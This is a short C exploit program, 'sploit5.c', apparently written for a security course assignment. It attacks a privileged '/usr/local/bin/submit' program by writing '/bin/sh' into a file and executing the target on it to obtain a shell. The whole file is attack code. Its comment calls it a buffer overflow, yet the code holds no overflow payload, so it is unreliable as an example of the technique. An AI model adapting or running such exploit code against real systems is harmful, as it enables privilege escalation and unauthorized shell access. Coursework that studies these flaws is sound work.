/*
 * sploit5.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit" // or submitV2
//#define TARGET "/share/submit"   // for testing only

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];

    system("echo '/bin/sh' >> newfile");
    

	args[0] = TARGET;
	args[1] = "newfile"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");
    

	
	return 1;
}
